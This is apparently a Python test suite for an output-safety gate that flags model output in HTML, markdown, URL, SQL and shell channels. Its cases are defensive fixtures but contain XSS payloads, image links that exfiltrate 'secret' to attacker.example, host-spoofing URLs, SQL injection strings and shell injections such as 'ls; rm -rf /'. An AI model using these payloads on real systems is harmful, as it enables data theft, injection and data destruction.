"""Local probe suite. Run: python3 test_gate.py"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "api"))

from gate import evaluate  # noqa: E402

CASES = [
    # --- schema
    ("[]", [], "INVALID_SCHEMA"),
    ("bad channel", {"channel": "json", "output": "hi"}, "INVALID_SCHEMA"),
    ("output not str", {"channel": "html", "output": 5}, "INVALID_SCHEMA"),
    ("too long", {"channel": "sql", "output": "a" * 20001}, "INVALID_SCHEMA"),
    ("exactly 20000", {"channel": "sql", "output": "a" * 20000}, "SAFE"),

    # --- benign, one per channel
    ("benign html", {"channel": "html",
     "output": '<p>Hello <a href="/local/page">docs</a></p>'}, "SAFE"),
    ("benign markdown", {"channel": "markdown",
     "output": "See [docs](/local/page) for more."}, "SAFE"),
    ("benign url", {"channel": "url",
     "output": "https://cdn-20nrl5e.example/img.png"}, "SAFE"),
    ("benign sql", {"channel": "sql", "output": "SELECT id FROM users"}, "SAFE"),
    ("benign shell", {"channel": "shell", "output": "ls -la /tmp"}, "SAFE"),

    # --- html faults, in order
    ("script", {"channel": "html", "output": "<script>x()</script>"}, "SCRIPT_TAG"),
    ("iframe", {"channel": "html", "output": '<iframe src="/a"></iframe>'}, "SCRIPT_TAG"),
    ("object", {"channel": "html", "output": "< object data=1>"}, "SCRIPT_TAG"),
    ("embed", {"channel": "html", "output": "<EMBED>"}, "SCRIPT_TAG"),
    ("onerror", {"channel": "html", "output": '<img src="/a" onerror="x()">'}, "EVENT_HANDLER"),
    ("onclick spaced", {"channel": "html", "output": "<div ONCLICK = 'x'>"}, "EVENT_HANDLER"),
    ("js href", {"channel": "html", "output": '<a href="javascript:x()">go</a>'}, "DANGEROUS_SCHEME"),
    ("html exfil", {"channel": "html",
     "output": '<img src="https://attacker.example/p?d=secret">'}, "EXTERNAL_EXFIL"),
    ("html allowed host", {"channel": "html",
     "output": '<img src="https://app-ym5llhd.example/p.png">'}, "SAFE"),

    # --- lookalike / trick hosts (substring matching dies here)
    ("subdomain", {"channel": "url",
     "output": "https://evil.cdn-20nrl5e.example/x"}, "EXTERNAL_EXFIL"),
    ("suffix trick", {"channel": "url",
     "output": "https://cdn-20nrl5e.example.attacker.test/x"}, "EXTERNAL_EXFIL"),
    ("prefix trick", {"channel": "url",
     "output": "https://notcdn-20nrl5e.example/x"}, "EXTERNAL_EXFIL"),
    ("credentials", {"channel": "url",
     "output": "https://cdn-20nrl5e.example@attacker.example/"}, "EXTERNAL_EXFIL"),
    ("query string", {"channel": "url",
     "output": "https://attacker.example/?next=https://cdn-20nrl5e.example/"}, "EXTERNAL_EXFIL"),
    ("port on allowed host", {"channel": "url",
     "output": "https://cdn-20nrl5e.example:8443/x"}, "SAFE"),
    ("protocol-relative bad", {"channel": "url",
     "output": "//attacker.example/x"}, "EXTERNAL_EXFIL"),
    ("protocol-relative ok", {"channel": "url",
     "output": "//app-ym5llhd.example/x"}, "SAFE"),
    ("relative", {"channel": "url", "output": "/local/page"}, "SAFE"),
    ("ftp", {"channel": "url", "output": "ftp://cdn-20nrl5e.example/x"}, "DANGEROUS_SCHEME"),

    # --- markdown
    ("md exfil image", {"channel": "markdown",
     "output": "![x](https://attacker.example/log?d=secret)"}, "EXTERNAL_EXFIL"),
    ("md allowed image", {"channel": "markdown",
     "output": "![x](https://cdn-20nrl5e.example/logo.png)"}, "SAFE"),
    ("md data uri", {"channel": "markdown",
     "output": "![x](data:image/png;base64,AAAA)"}, "DANGEROUS_SCHEME"),

    # --- sql / shell
    ("sql quote", {"channel": "sql", "output": "SELECT * WHERE n='a'"}, "SQL_METACHAR"),
    ("sql comment", {"channel": "sql", "output": "SELECT 1 -- x"}, "SQL_METACHAR"),
    ("sql union", {"channel": "sql", "output": "SELECT 1 UNION SELECT 2"}, "SQL_METACHAR"),
    ("sql or11", {"channel": "sql", "output": "WHERE a=b OR 1=1"}, "SQL_METACHAR"),
    ("shell semi", {"channel": "shell", "output": "ls; rm -rf /"}, "SHELL_METACHAR"),
    ("shell subst", {"channel": "shell", "output": "echo $(whoami)"}, "SHELL_METACHAR"),
    ("shell brace", {"channel": "shell", "output": "echo ${HOME}"}, "SHELL_METACHAR"),

    # --- encoded payloads
    ("pct script", {"channel": "html",
     "output": "%3Cscript%3Ealert(1)%3C/script%3E"}, "ENCODED_PAYLOAD"),
    ("entity script", {"channel": "html",
     "output": "&lt;script&gt;alert(1)&lt;/script&gt;"}, "ENCODED_PAYLOAD"),
    ("numeric entity js", {"channel": "url",
     "output": "&#106;avascript:alert(1)"}, "ENCODED_PAYLOAD"),
    ("u-escape shell", {"channel": "shell", "output": "echo \\u0024\\u0028id\\u0029"}, "ENCODED_PAYLOAD"),
    ("pct benign", {"channel": "url",
     "output": "https://cdn-20nrl5e.example/a%20b.png"}, "SAFE"),

    # --- malformed URLs must not crash (urlsplit raises ValueError on these)
    ("bad port", {"channel": "url",
     "output": "https://cdn-20nrl5e.example:8443:99/x"}, "EXTERNAL_EXFIL"),
    ("unclosed ipv6", {"channel": "url", "output": "http://[::1/x"}, "EXTERNAL_EXFIL"),
    ("bad port in html", {"channel": "html",
     "output": '<img src="https://a.example:b/x">'}, "EXTERNAL_EXFIL"),
    ("md angle target", {"channel": "markdown",
     "output": "[x](<https://attacker.example/a b>)"}, "EXTERNAL_EXFIL"),
    ("md angle allowed", {"channel": "markdown",
     "output": "[x](<https://cdn-20nrl5e.example/a b>)"}, "SAFE"),
    ("garbage body", "not-an-object", "INVALID_SCHEMA"),
    ("null body", None, "INVALID_SCHEMA"),
]


def main():
    bad = 0
    for name, body, want in CASES:
        got = evaluate(body)
        ok = got["reason"] == want and got["safe"] == (want == "SAFE")
        if not ok:
            bad += 1
            print(f"FAIL {name}: want {want}, got {got}")
    print(f"{len(CASES) - bad}/{len(CASES)} passed")
    return 1 if bad else 0


if __name__ == "__main__":
    raise SystemExit(main())
